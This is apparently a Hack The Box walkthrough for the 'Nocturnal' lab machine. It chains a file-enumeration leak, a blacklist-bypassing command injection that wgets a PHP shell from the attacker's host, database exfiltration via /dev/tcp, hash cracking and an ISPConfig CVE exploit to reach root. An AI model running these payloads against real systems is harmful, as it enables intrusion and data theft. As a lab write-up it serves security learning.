# Nocturnal – HTB Walkthrough

## 🌎 Enumeration

Initial port scan:

```bash
nmap -sS -sV -sC nocturnal.htb
```

Output:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

We add the domain to `/etc/hosts`:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

## 🔍 Web Enumeration

Visiting `http://nocturnal.htb` reveals login and registration forms. We register as `prova:prova`.

Inside the authenticated dashboard, we can upload files (`pdf`, `doc`, `odt`, etc.). Accessing them uses this URL format:

```
http://nocturnal.htb/view.php?username=prova&file=prova.pdf
```

Trying invalid filenames reveals all uploaded files for that user. By brute-forcing usernames (e.g. with `wfuzz`) we find:

```
amanda
```

Her file `privacy.odt` contains:

```
Temporary password: arHkG7HAI68X8s1J
```

Logging in as `amanda` grants **Admin Panel** access.

## 🤔 Source Code Review

Admin page `admin.php` allows backups via:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

The password field is weakly sanitized by a blacklist:

```php
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

We bypass it using encoded characters:

* `%0A` = newline
* `%09` = tab (interpreted as space)

## 🚀 Code Execution

Upload a PHP reverse shell to your machine and host it:

```bash
python3 -m http.server 1337
```

Exploit via POST to `/admin.php`:

```bash
password=%0A/usr/bin/wget%0910.10.15.3:1337/shell.php%0A&backup=
```

Trigger the shell:

```bash
curl http://nocturnal.htb/shell.php
```

Get a reverse shell:

```bash
nc -nvlp 4444
```

## 🔍 Looting the Box

Search for databases:

```bash
find / -regex ".*\.db" 2>/dev/null
```

Found:

```
/var/www/nocturnal_database/nocturnal_database.db
```

Dump it via:

```bash
cat /var/www/nocturnal_database/nocturnal_database.db > /dev/tcp/10.10.15.3/1339
```

Then crack the MD5 hash:

```bash
echo "55c82b1ccd55ab219b3b109b07d5061d" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
```

Result:

```
tobias:slowmotionapocalypse
```

## 💼 SSH Access

```bash
ssh tobias@nocturnal.htb
```

Check internal services:

```bash
ss -lnt
```

Port `8080` is open on localhost. Set up forwarding:

```bash
ssh -L 9090:localhost:8080 tobias@nocturnal.htb
```

Visit `http://localhost:9090`: ISPConfig panel.

## 🚫 CVE-2023-46818 - RCE via ISPConfig

Use the [PoC exploit](https://karmainsecurity.com/pocs/CVE-2023-46818.php). Example:

```bash
php exploit.php http://localhost:8080/ admin slowmotionapocalypse
```

Interactive shell prompt appears:

```
ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

## 🏁 Root Flag

```bash
cat /root/root.txt
```

→ ✅ **Rooted!**

## 🎉 Summary

| Step         | Description                                      |
| ------------ | ------------------------------------------------ |
| nmap         | Enumerated open ports (22, 80)                   |
| Upload       | Found file upload + filename enumeration         |
| File Leak    | Discovered `amanda` user + credentials from .odt |
| Admin Panel  | Identified ZIP command injection                 |
| Command Exec | Uploaded PHP shell via encoded injection         |
| DB Dump      | Dumped SQLite DB, cracked MD5 password           |
| SSH Access   | Logged in as `tobias`                            |
| Port Fwd     | Accessed ISPConfig on port 8080                  |
| CVE Exploit  | Used CVE-2023-46818 for RCE as root              |
| Root         | Captured `/root/root.txt`                        |